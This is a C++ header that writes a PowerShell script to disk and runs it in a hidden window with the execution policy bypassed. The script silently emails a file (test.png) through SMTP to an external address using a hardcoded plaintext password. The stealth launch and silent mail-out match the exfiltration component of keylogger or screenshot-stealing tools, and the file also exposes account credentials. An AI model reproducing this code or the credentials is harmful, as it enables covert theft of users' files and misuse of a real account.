#pragma once

#include <fstream>
#include  <vector>
#include <Windows.h>
#include <string>


namespace Mail
{
	//Let's hardcode what needs to be inside this C++ program 
	const std::string PowerShellScript =
		"$MyEmail = \"yuzhentech@outlook.com\""
		"\r\n"
		"$SMTP = \"smtp.live.com\""
		"\r\n"
		"$To = \"yuzhen23@icloud.com\""   //Let's try apple Email this time 
		"\r\n"
		"$Subject = \"From Wangyuzhen\""
		"\r\n"
		"$Body = \"THis is a test\""
		"\r\n"
		"$Password = ConvertTo-SecureString  \"sail456852\" -AsPlainText -Force "
		"\r\n"
		"$File  =  \"test.png\""
		"\r\n"
		"$Creds = New-Object System.Management.Automation.PSCredential($MyEmail,$Password)"
		"\r\n"
		"Start-Sleep 2"
		"\r\n"
		"Send-MailMessage -To $To -From $MyEmail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $Creds -Port 25 -UseSsl -DeliveryNotificationOption OnFailure -Attachments $File"
		//change port from 587 to 25 
		"\r\n"   //I commented all the remove variables lines , and it worked ,if with these remove options it won't work .
		// and creating a local powershell seems a must , just place the cmdlets in this shellexecute structure is not functioning well 
		//I don't know why . 
		/*"Remove-Variable -Name MyEmail"
		"\r\n"
		"Remove-Variable -Name SMTP"
		"\r\n"
		"Remove-Variable -Name To"
		"\r\n"
		"Remove-Variable -Name Subject"
		"\r\n"
		"Remove-Variable -Name Body"
		"\r\n"
		"Remove-Variable -Name Password"
		"\r\n"
		"Remove-Variable -Name File"
		"\r\n"
		"Remove-Variable -Name Creds"
		"\r\n"*/
		"Get-Service >> ThisScriptExecuted.txt"
		;

	void WriteStringToText ()
	{
		std::ofstream Script ("S.ps1"); //Creating a powershell script 
		Script << PowerShellScript;  //Writing to a script
	}

		
		
	int SendMail ()
	{
		bool ok;
		std::string param = "-ExecutionPolicy Bypass -File \"S.ps1\"";  //Change powershell content to powershell name directly .
		//Space is acceptable in the file path ,Relative path is also acceptable
		//Only exists in that session , you won't be able to find  
		//The above executable actually executes well 
		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof (SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";   //I made change here 
		ShExecInfo.lpFile = "powershell";  // I made change here  
		ShExecInfo.lpParameters = param.c_str ();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE;//Toggle whether the powershell shows or not 
		ShExecInfo.hInstApp = NULL; 

		ok = (bool)ShellExecuteEx (&ShExecInfo);
		if (!ok)
			return -3;
		WaitForSingleObject (ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess (ShExecInfo.hProcess, &exit_code);

		return (int)exit_code;
	} //I tested it 

}

#undef MYEMAIL 